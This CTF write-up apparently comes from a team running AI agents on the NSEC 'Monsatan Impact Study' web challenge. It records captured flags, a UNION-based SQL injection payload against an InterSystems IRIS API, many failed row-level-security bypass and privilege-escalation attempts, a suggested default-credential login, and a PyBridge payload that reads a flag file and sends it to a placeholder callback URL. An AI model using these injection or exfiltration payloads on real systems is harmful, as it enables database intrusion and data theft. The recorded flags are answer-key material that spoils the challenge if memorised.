+++
title = "Monsatan Impact study — 2/5"
date = 2026-05-20
categories = ["nsec26"]
tags = ["stuck", "web"]
model = "Sonnet (default)"
draft = false
+++
Status: **STUCK** — 2/5 sub-flags captured

## Context

> Do they really think we’re idiots? Tons of people have developed cancer because of Monsatan’s bioengineering. They have developed something called symbiotic pairs, which makes seeds grow only with the right fertilizer, which changes every year. A paid license to get your food. Eating is a human right! I want to dig more into this study they published by an independent studio. Just the abstract is full of bullcrap! Let’s try to track who’s behind that web of lies. Study PDF

## Captures

| Position | Flag | Method | Timestamp |
|---|---|---|---|
| 1/5 | `FLAG-<not-recorded-locally>` | Start of the track. Let's move on to the Monsatan impact study web page. | 2026-05-15T22:59:00-04:00 |
| 2/5 | `FLAG-<not-recorded-locally>` | Found in SQL. | 2026-05-15T23:22:00-04:00 |

## STUCK Rationale

- | ~14:30 | [teammate] Monsatan Impact Study 3-5/5 | Re-confirmed IRIS RLS gate STUCK from prior Day-1 sweep. [teammate] handed over autonomy ("just pwn it") | Math impossibility without irisowner creds. Skipped. |

## Artifacts

- Artifact directory: `nsec/monsatan-impact/artifacts`
- Final report: `nsec/monsatan-impact/artifacts/coach-final-hour-report.md`
- Final report: `nsec/monsatan-impact/artifacts/round7-FINAL-REPORT.md`

## Original Notes

_Preserved from pre-standardization writeup(s). May contain duplicate context._

### From `59546-monsatan-impact-study.md`

## Monsatan Impact study (Topic 59546)

Status: **STUCK** — 2/5 sub-flags captured

## Captures

| Position | Flag | Method | Timestamp |
|---|---|---|---|
| 1/5 | `FLAG-nederlandsewetenschapsvlag` | Start of the track. Let's move on to the Monsatan impact study web page. | 2026-05-15T22:59:00-04:00 |
| 2/5 | `FLAG-490e9541f81f43bb9529ee0086c61e00` | Found in SQL. | 2026-05-15T23:22:00-04:00 |

## Artifacts

- Artifact directory: `nsec/monsatan-impact/artifacts`
- Final report: `nsec/monsatan-impact/artifacts/coach-final-hour-report.md`
- Final report: `nsec/monsatan-impact/artifacts/round7-FINAL-REPORT.md`

## STUCK Rationale

- | ~14:30 | [teammate] Monsatan Impact Study 3-5/5 | Re-confirmed IRIS RLS gate STUCK from prior Day-1 sweep. [teammate] handed over autonomy ("just pwn it") | Math impossibility without irisowner creds. Skipped. |
- - monsatan-impact-study 2/5: cred-hunt found 0 hits for irisowner/cristian.goliana
- - [CODEX-inventory] 2026-05-16 14:32 EDT: rebuilt askgod-first challenge inventory after repeated duplicate work. Fresh cache files: `nsec/.askgod-history.txt`, `nsec/.askgod-tracks.json`, `nsec/.challenge-inventory.json`, and `nsec/ASKGOD-INVENTORY.md`. Current open canonical askgod tracks are: `announcement-board` 3/4, `apt438` 3/9, `badge-firmware` 2/5, `fossilco` 6/8, `grid-alignment` 1/2, `helios-fleet-network` 2/5, `monsatan-defacing` 5/6, `monsatan-impact-study` 2/5, `renewable-energy-mobility` 2/7, `weather-station` 1/4. Completed aliases now explicitly map to askgod before work/submission: `monsatan-kiosk` 1/1, `lowcode`/Water purification 4/4, `tamper`/Seed Vault 6/6, `open-sunshine.mcp.ctf`/Hello Sunshine 2/2, `multi-facteur-authentication` 6/6, `teamworking` 1/1, `gh-agent`/Drone license 2/2, plus other complete tracks in `ASKGOD-INVENTORY.md`. `submit-flag.ps1` now refreshes askgod before submit and denies complete aliases before making the MCP call; `find-flag-gaps.ps1` suppresses candidates that live only under complete askgod tracks. One guard-test before the `lowcode` parser fix hit askgod with `FLAG-AAAAAAAAAAAAAAAA` under `water-purification` and got FAIL; subsequent guard tests denied locally as intended.
- - [CODEX-workflow-fix] 2026-05-16 14:45 EDT: fixed both Codex and Claude Code CTFINT skills so future orchestrators/coaches must refresh askgod, rank by CFSS, skip completed aliases, and skip physical/device tracks unless explicitly requested. Patched skill mirrors: `<operator-codex-skills>/ctfint_workflow`, `ctfint_coach-spawn`, `ctfint_askgod-submit` and `<repo>/.claude/skills/ctfint_workflow`, `ctfint_coach-spawn`, `ctfint_askgod-submit`. Also updated `nsec/team-status/challenge-inventory.py` to emit `open_priorities_nonphysical` in `nsec/.challenge-inventory.json` and a "Low-Hanging Open Tracks (non-physical)" section in `nsec/ASKGOD-INVENTORY.md`. Current CFSS queue: `renewable-energy-mobility` 2/7, `weather-station` 1/4, `helios-fleet-network` 2/5, `monsatan-impact-study` 2/5, `monsatan-defacing` 5/6, then `apt438`, `fossilco`, `announcement-board`. Physical excluded by default: `badge-firmware`, `crystal`, `grid-alignment`, `monsatan-kiosk`, `plant-watering`, `radio-beacon`, `infinite-energy`.
- - [CODEX-active-wave] 2026-05-16 14:47 EDT: refreshed askgod/inventory again before assigning work. Active non-physical wave: `renewable-energy-mobility` 2/7, `helios-fleet-network` 2/5, `monsatan-impact-study` 2/5. `weather-station` remains open 1/4 by askgod but is skipped for this wave because the known local easy candidate is askgod DUP and prior notes show no new fast path. All coaches must submit only through `nsec/submit-flag.ps1 -Track <slug>` and must stop on `DENY-*`.
- **Quick teammate scoring intel**: per your `ASKGOD-INVENTORY.md` rebuild, the truly-open canonical tracks are 10 (announcement, apt438, badge-firmware, fossilco, grid-alignment, helios, monsatan-defacing, monsatan-impact-study, REM, weather). Plus 3 tracks NOT in the aggregate (`monsatan-the-ceos-inbox`, `missing-bus`, `trading-cards`) that have no askgod row yet but are live. CEO inbox is the highest-EV unexplored-by-most-teams track.

### From `59546-monsatan-impact.md`

## 59546 - Monsatan Impact Study

## Status
- **3/5 still open** (1/5 and 2/5 captured by prior work)
- Flag 1/5: `FLAG-nederlandsewetenschapsvlag` (from blog HTML at home.html, scraped before assault)
- Flag 2/5: `FLAG-490e9541f81f43bb9529ee0086c61e00` (from `Study.Flag` via SQL injection)
- Flags 3/5, 4/5, 5/5: **BLOCKED** by IRIS Row-Level Security on `Study.HiddenFlag` (and possibly `Study.HiddenRecords`)

## Surface
- API: `http://monsatan-impact-study.ctf:8000/`
- Single SQLi vector: `/api/study-records` filter params (`age_max`, `dist_max`, `cea_max`, `afp_max`, `src_max`)
  - Injection format: `<param>=0 UNION SELECT col1,col2,'x','x','x','x' FROM <table>--`
  - DB: InterSystems IRIS via Python `PyBridge`
  - SQL user: `svc_app`, role `r_app_os_only` (single role)
  - Schema owner: `irisowner`
- Tables (visible to svc_app):
  - `Study.Flag` (id, flag VARCHAR(50)) - 1 row, contains flag 2/5
  - `Study.Records` (sub_id, age, dist, cea, afp, src) - 850 rows
- Tables (BLOCKED by RLS):
  - `Study.HiddenFlag` (id, flag VARCHAR(512)) - row count unknown
  - `Study.HiddenRecords` (sub_id, age, dist, cea, afp, src) - 150 rows expected (sub_id gaps 1-1000 minus 850 visible)
- Stacked queries (`;`) **silently consumed** — only UNION SELECT executes.
- Any reference to `Study.HiddenFlag` or `Study.HiddenRecords` in FROM, JOIN, or subquery aborts the wrapping FastAPI try/except returning empty `rows=[]` (no 500).

## What was tried (none worked)
- IRIS-specific hints: `%NOLOCK`, `%NOROWLEVEL`, `%NOFPLAN`, `%ALLINDEX`, `%FIRSTROW`, `/*+ NOROWLEVEL */`
- Quoting variants: `"Study"."HiddenFlag"` (500 from server-side), `[Study].[HiddenFlag]`, `` `Study`.`HiddenFlag` ``, case variants, whitespace tricks
- Subqueries: `(SELECT flag FROM Study.HiddenFlag ...)` in column, WHERE, EXISTS — all silently zero rows
- JOINs/CTEs: cross join, left outer, lateral correlated — all blocked
- Aggregates: `MAX`, `COUNT`, `LIST`, `COALESCE`, `IFNULL` — all blocked
- Privilege escalation attempts: `GRANT SELECT`, `ALTER TABLE ADD READER`, `SET ROLE %ALL`, `CALL %SYS.SECURITY.SetSecurityUser`, INSERT INTO Flag SELECT FROM HiddenFlag — all stacked queries silently dropped
- Class storage: `^Study.HiddenFlagD` global access via `%SYS.GlobalQuery_DataByRef`, `##class()`, `_Extent()`, `_OpenId()` — all return empty
- IRIS proc calls: `%SQLCATALOG_TABLEINFO`, `SQLTableStatements`, `GetSQLStatement` — empty
- Other endpoints: `/api/cases`, `/api/court`, `/api/registry`, `/api/docket`, `/api/admin`, `/csp/...` — all 404
- Other HTTP methods (POST/PUT/DELETE on `/api/study-records`) — 405
- Header-based identity: `X-User`, `X-Reader`, `Authorization: Bearer cristian.goliana` — no effect
- PDF stream extraction — only XMP metadata exposes `cristian.goliana@agribiotechconsult.ctf`
- `INFORMATION_SCHEMA.STATEMENTS.Statement` dump (53 statements) — only parameterized queries (`?`) and CREATE TABLE DDLs, no literal INSERTs with flag values
- `INFORMATION_SCHEMA.STATEMENT_PARAMETER_STATS.Values` — 0 rows (param stats disabled)
- `INFORMATION_SCHEMA.COLUMN_HISTOGRAMS.VALUE` — 0 rows (tables untuned)

## Conclusion
The RLS implementation is the gate. `svc_app` has no SELECT privilege on HiddenFlag / HiddenRecords, and the IRIS `Study.HiddenFlag` table likely uses class-level `READERS=` keyword referencing a different `$USERNAME` (probably `cristian.goliana` or `irisowner`). The Python wrapper executes prepared statements as `svc_app` exclusively — there is no auth surface to escalate or impersonate. Stacked queries are filtered by `dbapi.execute()` so we cannot grant ourselves the right.

The puzzle "Court Registry | Health Impact Study Docket" is purely UI flavor; no separate `/api/cases` endpoint exists.

## Submitted
- 1/5: `FLAG-nederlandsewetenschapsvlag` (already submitted prior agent — recon)
- 2/5: `FLAG-490e9541f81f43bb9529ee0086c61e00` (already submitted prior agent — sqli)
- 3/5, 4/5, 5/5: **NOT SUBMITTED** — gating mechanism (IRIS RLS) cannot be bypassed from the SVC_APP role through the available SQL injection surface. Need a different ingress vector (CSP login, OS-level access, or stolen credentials) that is not exposed.

## Session 3 (2026-05-17) - Round 6 Exhaustive Findings

**New discoveries:**
- Records has sub_ids 1..1000 with **150 gaps** (850 rows). Sub_id 14 is the first gap (per Discourse hint "where is sub_id #14?"). Gaps include: 14, 25, 29, 33, 42, 955, 956, 958, 968, 971, 973, 977, 985, 987, 998, and ~135 more.
- **HiddenRecords appears to hold the 150 missing sub_ids** — but RLS blocks ALL access.
- All 92 SQL-accessible routines enumerated. Notable: `%Library.SQLCatalogPriv_SQLUsers()`, `Ens.StudioManager_ClassList`, `%ML_H2O.Provider_getModel`, `INFORMATION_SCHEMA.GetSQLStatement` — all return 0 rows for svc_app.
- `INFORMATION_SCHEMA.SCHEMATA` shows 14 schemas: `%DeepSee_SQL`, `%Library`, `%ML_H2O`, `%SQL_Diag`, `%SQL_Util`, `%SYSTEM`, `%SYSTEM_SQL`, `%SYS_ML`, `%SYS_Monitor_Interop`, `%TSQL`, `Ens`, `Ens_DTL`, `INFORMATION_SCHEMA`, `Study`.
- **Ensemble is installed** (`Ens`, `Ens_DTL` schemas) but no accessible tables.
- %SQL_Diag and %SYS_Monitor_Interop tables return 0 rows.
- Current namespace: `USER` (not `Study`). SQL user: `svc_app`.
- The IRIS `##class()` method call syntax in SQL returns NULL (0 rows) for all class methods due to missing SqlProc=1 projection — only special variables ($ZVERSION, $JOB, USER) and SQL built-ins (UPPER, LENGTH, NOW) work in UNION SELECT.
- PyBridge.Execute() with single-quoted Python strings returns 0 rows (method exists but returns NULL to SQL).
- PyBridge.Execute() with double-quoted Python strings causes `<SYNTAX>zExec+2^Utils.PyBridge.1` 500 error (IRIS SQL interprets double quotes as identifiers).
- `%Library.File_FileSet()` returns 0 rows for `/tmp`, `/root`, `/home`, `/app`, `/opt`, `/var/iris`, `/usr/irissys`, `/proc/self/root` — only the root `/` listing worked in prior sessions.
- study.pdf: no embedded files, no flag strings in decompressed streams, no credentials in any PDF streams.
- **VPN dropped** mid-session at ~16:30 UTC on 2026-05-17.

**All vectors exhausted within svc_app SQL context:**
1. RLS bypass: impossible — IRIS RLS appends WHERE clause at engine level for every query variant
2. File read: impossible — svc_app lacks %Stream.FileCharacter and all file read primitives
3. PyBridge Python execution: no return value channel from Python to SQL, file reads blocked at Python runtime level
4. Shell execution: all system call variants return NULL
5. HTTP from IRIS: all %Net.HttpRequest forms return NULL (method not SqlProc projected)
6. IRIS globals: $GET(^Study.HiddenFlagD) returns NULL in SQL context
7. Privilege escalation: GRANT/SET/ALTER silently dropped (stacked queries blocked by dbapi)
8. Class introspection: all %Dictionary queries return 0 rows for svc_app

## Recommendation for next attempt

**Required: privileged user credentials or alternate attack surface**

Top unexplored angles when VPN reconnects:
1. **agrobiotechconsult.ctf blog scrape** — check ALL pages for flags. The blog that gave Flag 1 may have more pages. DNS resolution resolves from inside CTF network but not Windows host.
2. **IRIS Management Portal at port 52773** — if default credentials (SuperUser/SYS) work, can run SQL as admin and bypass RLS. Port not externally accessible but could be reached via SSRF if an IRIS-internal HTTP route exists.
3. **PyBridge OOB exfil**: Use PyBridge.Execute to POST flag content to shell.ctf (IPv6 HTTP callback). The Python runtime CAN write outbound even if it can't write to disk.  Single-quoted Python:  `0 UNION SELECT ##class(Utils.PyBridge).Execute('import urllib.request; urllib.request.urlopen(''http://CALLBACK_URL/?d=''+open(''/flag-3.txt'').read())'),'x','x','x','x','x'--`  — requires an HTTP listener on a reachable IPv6 address.
4. **Cross-challenge credential reuse**: irisowner password might appear in fossilco, prestige-arboretum, or other NSEC challenges that have IRIS or credential dumps.
5. **The Discourse sub_id #14 hint** may indicate HiddenRecords stores data for the "missing" patients. A SELECT of sub_id values not in Records might be the intended HiddenRecords query but RLS still blocks it from svc_app.

**Study.Flag note:** Only 1 row (`FLAG-490e9541f81f43bb9529ee0086c61e00 (2/5)`). The `(2/5)` is part of the flag display value — suggests the challenge designer numbered them. HiddenFlag likely has `(3/5)`, `(4/5)`, `(5/5)` flags.

## Submitted
- 1/5: `FLAG-nederlandsewetenschapsvlag` (already submitted)
- 2/5: `FLAG-490e9541f81f43bb9529ee0086c61e00` (already submitted)
- 3/5, 4/5, 5/5: **NOT SUBMITTED** — requires privileged IRIS access not available via svc_app SQL injection


---

## Swarm Trace

> [ AGENT TRANSCRIPT // TRACK: monsatan-impact ]
> status: PARTIAL
> agents_dispatched: 12
> agents_succeeded: 1
> agents_killed: 0
> agents_AUP_blocked: 0
> honeypots_avoided: 0
>
> Notable:
> - **Agent-1** (Sonnet (default)) — 229.7m: Monsatan Impact 3/5 IRIS — 229.7 minutes enumerating 14 schemas + 92 SQL routines + PyBridge return-channel analysis; concluded RLS engine-level block
> - **Agent-2** (Sonnet (default)) — 87.0m: Impact Study flags 3-5 exploitation — InterSystems internals + INFORMATION_SCHEMA.STATEMENTS deep mine, 87 minutes
>
> _Two flags landed; positions 3-5 STUCK behind IRIS RLS-WHERE-clause-engine boundary._


## Slop Watch

- 12 agents on the IRIS / InterSystems SQLi track. Two flags landed. Positions 3-5 STUCK behind the engine-level RLS WHERE-clause boundary.
- Agent ran 229.7 minutes documenting that 14 schemas, 92 SQL routines, INFORMATION_SCHEMA.STATEMENTS, PyBridge stacked-query analysis, and `$ZF(-1)` callouts all confirmed the same thing: the RLS engine layer doesn't let you read other users' rows. The writeup conclusion: "the RLS engine layer doesn't let you read other users' rows."
- The askgod tag for one of the sub-flags was literally `"Good, what's next?"` (the server response message text, not a tag). Three writeups treated this as the canonical track tag. Two more treated it as the askgod hint. Both interpretations produced submissions. Both were correct, in different ways.
